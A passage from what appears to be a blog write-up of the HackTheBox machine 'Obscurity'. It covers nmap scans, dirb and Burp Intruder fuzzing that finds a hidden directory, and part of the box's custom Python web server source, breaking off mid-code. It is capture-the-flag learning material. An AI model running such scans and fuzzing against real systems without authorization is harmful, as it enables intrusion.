<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Obscurity | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/05/htb-obscurity.html" title="Read more" class="entry-title-link">
                HTB: Obscurity</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-05-11T10:05:00+02:00">11 May 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/crypto.html" title="Read more with the label Crypto" class="meta-link">Crypto</a> 
          <a href="../../tag/linux.html" title="Read more with the label Linux" class="meta-link">Linux</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 15 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.05/obscurity_card.png" alt="Obscurity card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.com/home/machines/profile/219">Obscurity</a>
This box is classified as a medium machine. It was release on December the first
2019 by <a href="https://www.hackthebox.com/home/users/profile/83743">clubby789</a>.
It implies some enumeration and a lot of python.</p>


<h1 id="getting-user">Getting User</h1>
<h2 id="recon">Recon</h2>
<p>We start with a <code>nmap</code> scan. Only port 22 (SSH) and port 8080 are open.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Fri Dec  6 04:58:41 2019 as: nmap -sS -p- -oA nmap 10.10.10.168</span>
<span class="code-line">Nmap scan report for 10.10.10.168</span>
<span class="code-line">Host is up (0.091s latency).</span>
<span class="code-line">Not shown: 65531 filtered ports</span>
<span class="code-line">PORT     STATE  SERVICE</span>
<span class="code-line">22/tcp   open   ssh</span>
<span class="code-line">80/tcp   closed http</span>
<span class="code-line">8080/tcp open   http-proxy</span>
<span class="code-line">9000/tcp closed cslistener</span>
<span class="code-line"></span>
<span class="code-line"># Nmap done at Fri Dec  6 05:01:34 2019 -- 1 IP address (1 host up) scanned in 173.56 seconds</span>
<span class="code-line"></code></pre></div>

<p>We run a service scan on this two ports, the second port is an HTTP server.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Fri Dec  6 05:11:21 2019 as: nmap -sSV -p22,8080-oA service 10.10.10.168</span>
<span class="code-line">Nmap scan report for 10.10.10.168</span>
<span class="code-line">Host is up (0.092s latency).</span>
<span class="code-line"></span>
<span class="code-line">PORT     STATE  SERVICE    VERSION</span>
<span class="code-line">22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
<span class="code-line">8080/tcp open   http-proxy BadHTTPServer</span>
<span class="code-line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span>
<span class="code-line">SF-Port8080-TCP:V=7.80%I=7%D=12/6%Time=5DEA2950%P=x86_64-pc-linux-gnu%r(Ge</span>
<span class="code-line">SF:tRequest,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x20Fri,\x2006\x20Dec\x2020</span>
<span class="code-line">SF:19\x2010:12:29\nServer:\x20BadHTTPServer\nLast-Modified:\x20Fri,\x2006\</span>
<span class="code-line">SF:x20Dec\x202019\x2010:12:29\nContent-Length:\x204171\nContent-Type:\x20t</span>
<span class="code-line">SF:ext/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;</span>
<span class="code-line">SF:en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t&lt;title&gt;0bscura&lt;/title&gt;\</span>
<span class="code-line">SF:n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE=Edge\&quot;&gt;\n\t&lt;</span>
<span class="code-line">SF:meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-s</span>
<span class="code-line">SF:cale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20content=\&quot;\&quot;&gt;\n\t&lt;meta\x20na</span>
<span class="code-line">SF:me=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\nEasy\x20Profile\x20Templ</span>
<span class="code-line">SF:ate\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&gt;\n\t&lt;!--\x20st</span>
<span class="code-line">SF:ylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/boo</span>
<span class="code-line">SF:tstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/font-a</span>
<span class="code-line">SF:wesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/templa</span>
<span class="code-line">SF:temo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&quot;scroll\&quot;\x20data-target</span>
<span class="code-line">SF:=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x20section\x20--&gt;\n&lt;!--\n&lt;</span>
<span class="code-line">SF:div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;sk-spinner\x20sk-spinner</span>
<span class="code-line">SF:-wordpress\&quot;&gt;\n&quot;)%r(HTTPOptions,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x20</span>
<span class="code-line">SF:Fri,\x2006\x20Dec\x202019\x2010:12:30\nServer:\x20BadHTTPServer\nLast-M</span>
<span class="code-line">SF:odified:\x20Fri,\x2006\x20Dec\x202019\x2010:12:30\nContent-Length:\x204</span>
<span class="code-line">SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20</span>
<span class="code-line">SF:html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t</span>
<span class="code-line">SF:&lt;title&gt;0bscura&lt;/title&gt;\n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20co</span>
<span class="code-line">SF:ntent=\&quot;IE=Edge\&quot;&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=dev</span>
<span class="code-line">SF:ice-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20conte</span>
<span class="code-line">SF:nt=\&quot;\&quot;&gt;\n\t&lt;meta\x20name=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\nE</span>
<span class="code-line">SF:asy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pro</span>
<span class="code-line">SF:file\n--&gt;\n\t&lt;!--\x20stylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;stylesh</span>
<span class="code-line">SF:eet\&quot;\x20href=\&quot;css/bootstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet</span>
<span class="code-line">SF:\&quot;\x20href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet</span>
<span class="code-line">SF:\&quot;\x20href=\&quot;css/templatemo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&quot;</span>
<span class="code-line">SF:scroll\&quot;\x20data-target=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x20</span>
<span class="code-line">SF:section\x20--&gt;\n&lt;!--\n&lt;div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;s</span>
<span class="code-line">SF:k-spinner\x20sk-spinner-wordpress\&quot;&gt;\n&quot;);</span>
<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
<span class="code-line"></span>
<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="code-line"># Nmap done at Fri Dec  6 05:11:35 2019 -- 1 IP address (1 host up) scanned in 13.83 seconds</span>
<span class="code-line"></code></pre></div>

<h2 id="web">Web</h2>
<p>We take a look at the home page. A few sentences inform us that the web server
is a custom one and that its source code is in a python file inside the
development directory.</p>
<blockquote>
<p>Here at 0bscura, we take a unique approach to security: you can't be hacked
if attackers don't know what software you're using!</p>
<p>That's why our motto is 'security through obscurity'; we write all our own
software from scratch, even the webserver this is running on! This means that
no exploits can possibly exist for it, which means it's totally secure!</p>
<p>Development
Server Dev</p>
<p>Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory</p>
</blockquote>
<p>We launch a <code>dirb</code> in order to find this secret development directory. But
nothing come up.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>-----------------</span>
<span class="code-line">DIRB v2.22</span>
<span class="code-line">By The Dark Raver</span>
<span class="code-line">-----------------</span>
<span class="code-line"></span>
<span class="code-line">OUTPUT_FILE: dirb</span>
<span class="code-line">START_TIME: Fri Dec  6 05:50:36 2019</span>
<span class="code-line">URL_BASE: http://10.10.10.168:8080/</span>
<span class="code-line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span>
<span class="code-line"></span>
<span class="code-line">-----------------</span>
<span class="code-line"></span>
<span class="code-line">GENERATED WORDS: 4612</span>
<span class="code-line"></span>
<span class="code-line">---- Scanning URL: http://10.10.10.168:8080/ ----</span>
<span class="code-line">+ http://10.10.10.168:8080/index.html (CODE:200|SIZE:4171)</span>
<span class="code-line"></span>
<span class="code-line">-----------------</span>
<span class="code-line">END_TIME: Fri Dec  6 06:06:25 2019</span>
<span class="code-line">DOWNLOADED: 4612 - FOUND: 1</span>
<span class="code-line"></code></pre></div>

<p>We know that the folder will contain the <code>SuperSecureServer.py</code> file.
We fire up burp and load the following in our intruder.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET /§§/SuperSecureServer.py HTTP/1.1</span>
<span class="code-line">Host: 10.10.10.168:8080</span>
<span class="code-line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="code-line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="code-line">Accept-Language: en-US,en;q=0.5</span>
<span class="code-line">Accept-Encoding: gzip, deflate</span>
<span class="code-line">Connection: close</span>
<span class="code-line">Upgrade-Insecure-Requests: 1</span>
<span class="code-line">If-Modified-Since: Fri, 06 Dec 2019 14:51:43</span>
<span class="code-line">Cache-Control: max-age=0</span>
<span class="code-line"></code></pre></div>

<p>We attack it in sniper mod using the <code>dirb</code> wordlist in
<code>/usr/share/dirb/wordlists/common.txt</code>.</p>
<p>We sort the result by response's size and found the <code>develop</code> directory.</p>
<p><img alt="burp intruder" src="/media/2020.05/obscurity_1.png"></p>
<p>We <code>wget</code> the code on our machine.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">socket</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">threading</span></span>
<span class="code-line"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">sys</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">os</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">mimetypes</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">urllib.parse</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">subprocess</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">respTemplate</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;HTTP/1.1 </span><span class="si">{statusNum}</span><span class="s2"> </span><span class="si">{statusCode}</span><span class="s2"></span></span>
<span class="code-line"><span class="s2">Date: </span><span class="si">{dateSent}</span><span class="s2"></span></span>
<span class="code-line"><span class="s2">Server: </span><span class="si">{server}</span><span class="s2"></span></span>
<span class="code-line"><span class="s2">Last-Modified: </span><span class="si">{modified}</span><span class="s2"></span></span>
<span class="code-line"><span class="s2">Content-Length: </span><span class="si">{length}</span><span class="s2"></span></span>
<span class="code-line"><span class="s2">Content-Type: </span><span class="si">{contentType}</span><span class="s2"></span></span>
<span class="code-line"><span class="s2">Connection: </span><span class="si">{connectionType}</span><span class="s2"></span></span>
<span class="code-line"></span>
<span class="code-line"><span class="si">{body}</span><span class="s2"></span></span>
<span class="code-line"><span class="s2">&quot;&quot;&quot;</span></span>
<span class="code-line"><span class="n">DOC_ROOT</span> <span class="o">=</span> <span class="s2">&quot;DocRoot&quot;</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">CODES</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;200&quot;</span><span class="p">:</span> <span class="s2">&quot;OK&quot;</span><span class="p">,</span></span>
<span class="code-line">        <span class="s2">&quot;304&quot;</span><span class="p">:</span> <span class="s2">&quot;NOT MODIFIED&quot;</span><span class="p">,</span></span>
<span class="code-line">        <span class="s2">&quot;400&quot;</span><span class="p">:</span> <span class="s2">&quot;BAD REQUEST&quot;</span><span class="p">,</span> <span class="s2">&quot;401&quot;</span><span class="p">:</span> <span class="s2">&quot;UNAUTHORIZED&quot;</span><span class="p">,</span> <span class="s2">&quot;403&quot;</span><span class="p">:</span> <span class="s2">&quot;FORBIDDEN&quot;</span><span class="p">,</span> <span class="s2">&quot;404&quot;</span><span class="p">:</span> <span class="s2">&quot;NOT FOUND&quot;</span><span class="p">,</span></span>
<span class="code-line">        <span class="s2">&quot;500&quot;</span><span class="p">:</span> <span class="s2">&quot;INTERNAL SERVER ERROR&quot;</span><span class="p">}</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">MIMES</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;txt&quot;</span><span class="p">:</span> <span class="s2">&quot;text/plain&quot;</span><span class="p">,</span> <span class="s2">&quot;css&quot;</span><span class="p">:</span><span class="s2">&quot;text/css&quot;</span><span class="p">,</span> <span class="s2">&quot;html&quot;</span><span class="p">:</span><span class="s2">&quot;text/html&quot;</span><span class="p">,</span> <span class="s2">&quot;png&quot;</span><span class="p">:</span> <span class="s2">&quot;image/png&quot;</span><span class="p">,</span> <span class="s2">&quot;jpg&quot;</span><span class="p">:</span><span class="s2">&quot;image/jpg&quot;</span><span class="p">,</span></span>
<span class="code-line">        <span class="s2">&quot;ttf&quot;</span><span class="p">:</span><span class="s2">&quot;application/octet-stream&quot;</span><span class="p">,</span><span class="s2">&quot;otf&quot;</span><span class="p">:</span><span class="s2">&quot;application/octet-stream&quot;</span><span class="p">,</span> <span class="s2">&quot;woff&quot;</span><span class="p">:</span><span class="s2">&quot;font/woff&quot;</span><span class="p">,</span> <span class="s2">&quot;woff2&quot;</span><span class="p">:</span> <span class="s2">&quot;font/woff2&quot;</span><span class="p">,</span></span>
<span class="code-line">        <span class="s2">&quot;js&quot;</span><span class="p">:</span><span class="s2">&quot;application/javascript&quot;</span><span class="p">,</span><span class="s2">&quot;gz&quot;</span><span class="p">:</span><span class="s2">&quot;application/zip&quot;</span><span class="p">,</span> <span class="s2">&quot;py&quot;</span><span class="p">:</span><span class="s2">&quot;text/plain&quot;</span><span class="p">,</span> <span class="s2">&quot;map&quot;</span><span class="p">:</span> <span class="s2">&quot;application/octet-stream&quot;</span><span class="p">}</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">class</span> <span class="nc">Response</span><span class="p">:</span></span>
<span class="code-line">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="vm">__dict__</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">kwargs</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">dateSent</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">modified</span> <span class="o">=</span> <span class="n">now</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%a</span><span class="s2">, </span><span class="si">%d</span><span class="s2"> %b %Y %H:%M:%S&quot;</span><span class="p">)</span></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">stringResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span></span>
<span class="code-line">        <span class="k">return</span> <span class="n">respTemplate</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="bp">self</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">class</span> <span class="nc">Request</span><span class="p">:</span></span>
<span class="code-line">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">good</span> <span class="o">=</span> <span class="kc">True</span></span>
<span class="code-line">        <span class="k">try</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">request</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parseRequest</span><span class="p">(</span><span class="n">request</span><span class="p">)</span></span>
<span class="code-line">            <span class="bp">self</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s2">&quot;method&quot;</span><span class="p">]</span></span>
<span class="code-line">            <span class="bp">self</span><span class="o">.</span><span class="n">doc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s2">&quot;doc&quot;</span><span class="p">]</span></span>
<span class="code-line">            <span class="bp">self</span><span class="o">.</span><span class="n">vers</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s2">&quot;vers&quot;</span><span class="p">]</span></span>
<span class="code-line">            <span class="bp">self</span><span class="o">.</span><span class="n">header</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s2">&quot;header&quot;</span><span class="p">]</span></span>
<span class="code-line">            <span class="bp">self</span><span class="o">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s2">&quot;body&quot;</span><span class="p">]</span></span>
<span class="code-line">        <span class="k">except</span><span class="p">:</span></span>
<span class="code-line">            <span class="bp">self</span><span class="o">.</span><span class="n">good</span> <span class="o">=</span> <span class="kc">False</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">parseRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span></span>
<span class="code-line">        <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\r</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">method</span><span class="p">,</span><span class="n">doc</span><span class="p">,</span><span class="n">vers</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="n">header</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span></span>
<span class="code-line">        <span class="n">body</span> <span class="o">=</span> <span class="n">req</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span></span>
<span class="code-line">        <span class="n">headerDict</span> <span class="o">=</span> <span class="p">{}</span></span>
<span class="code-line">        <span class="k">for</span> <span class="n">param</span> <span class="ow">in</span> <span class="n">header</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">pos</span> <span class="o">=</span> <span class="n">param</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span></span>
<span class="code-line">            <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">param</span><span class="p">[:</span><span class="n">pos</span><span class="p">],</span> <span class="n">param</span><span class="p">[</span><span class="n">pos</span><span class="o">+</span><span class="mi">2</span><span class="p">:]</span></span>
<span class="code-line">            <span class="n">headerDict</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="n">key</span><span class="p">:</span> <span class="n">val</span><span class="p">})</span></span>
<span class="code-line">        <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;method&quot;</span><span class="p">:</span> <span class="n">method</span><span class="p">,</span> <span class="s2">&quot;doc&quot;</span><span class="p">:</span> <span class="n">doc</span><span class="p">,</span> <span class="s2">&quot;vers&quot;</span><span class="p">:</span> <span class="n">vers</span><span class="p">,</span> <span class="s2">&quot;header&quot;</span><span class="p">:</span> <span class="n">headerDict</span><span class="p">,</span> <span class="s2">&quot;body&quot;</span><span class="p">:</span> <span class="n">body</span><span class="p">}</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">class</span> <span class="nc">Server</span><span class="p">:</span></span>
<span class="code-line">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="p">))</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span></span>
<span class="code-line">        <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span></span>
<span class="code-line">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">client</span><span class="p">,</span> <span class="n">address</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span></span>
<span class="code-line">            <span class="n">client</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span></span>
<span class="code-line">            <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">listenToClient</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">address</span><span class="p">))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">listenToClient</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span></span>
<span class="code-line">        <span class="n">size</span> <span class="o">=</span> <span class="mi">1024</span></span>
<span class="code-line">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span></span>
<span class="code-line">            <span class="k">try</span><span class="p">:</span></span>
<span class="code-line">                <span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">size</span><span class="p">)</span></span>
<span class="code-line">                <span class="k">if</span> <span class="n">data</span><span class="p">:</span></span>
<span class="code-line">                    <span class="c1"># Set the response to echo back the recieved data</span></span>
<span class="code-line">                    <span class="n">req</span> <span class="o">=</span> <span class="n">Request</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span></span>
<span class="code-line">                    <span class="bp">self</span><span class="o">.</span><span class="n">handleRequest</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">client</span><span class="p">,</span> <span class="n">address</span><span class="p">)</span></span>
<span class="code-line">                    <span class="n">client</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span></span>
<span class="code-line">                    <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span>
<span class="code-line">                <span class="k">else</span><span class="p">:</span></span>
<span class="code-line">                    <span class="k">raise</span> <span class="n">error</span><span class="p">(</span><span class="s1">&#39;Client disconnected&#39;</span><span class="p">)</span></span>
<span class="code-line">            <span class="k">except</span><span class="p">:</span></span>
<span class="code-line">                <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span>
<span class="code-line">                <span class="k">return</span> <span class="kc">False</span></span>
<span class="code-line"></span>
<span class="code-line">    <span class="k">def</span> <span class="nf">handleRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">conn</span><span class="p">,</span> <span class="n">address</span><span class="p">):</span></span>
<span class="code-line">        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">good</span><span class="p">:</span></span>
<span class="code-line">  <span class="c1">#            try:</span></span>
<span class="code-line">                <span class="c1"># print(str(request.method) + &quot; &quot; + str(request.doc), end=&#39; &#39;)</span></span>
<span class="code-line">                <span class="c1"># print(&quot;from {0}&quot;.format(address[0]))</span></span>
<span class="code-line">  <span class="c1">#            except Exception as e:</span></span>
<span class="code-line">  <span class="c1">#                print(e)</span></span>
<span class="code-line">            <span class="n">document</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">serveDoc</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">doc</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span></span>
<span class="code-line">            <span class="n">statusNum</span><span class="o">=</span><span class="n">document</span><span class="p">[</span><span class="s2">&quot;status&quot;</span><span class="p">]</span></span>
<span class="code-line">        <span class="k">else</span><span class="p">:</span></span>
<span class="code-line">            <span class="n">document</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">serveDoc</span><span class="p">(</span><span class="s2">&quot;/errors/400.html&quot;</span><span class="p">,</span> <span class="n">DOC_ROOT</span><span class="p">)</span></span>
<span class="code-line">            <span class="n">statusNum</span><span class="o">=</span><span class="s2">&quot;400&quot;</span></span>
<span class="code-line">        <span class="n">body</span> <span class="o">=</span> <span class="n">document</span><span class="p">[</span><span class="s2">&quot;body&quot;</span><span class="p">]</span></span>
<span class="code-line"></span>
<span class="code-line">        <span class="n">statusCode</span><span class="o">=</span><span class="n">CODES</span><span class="p">[</span><span class="n">statusNum</span><span class="p">]</span></span>
<span class="code-line">        <span class="n">dateSent</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span></span>
<span class="code-line">        <span class="n">server</span> <span class="o">=</span> <span class="s2">&quot;BadHTTPServer&quot;</span></span>
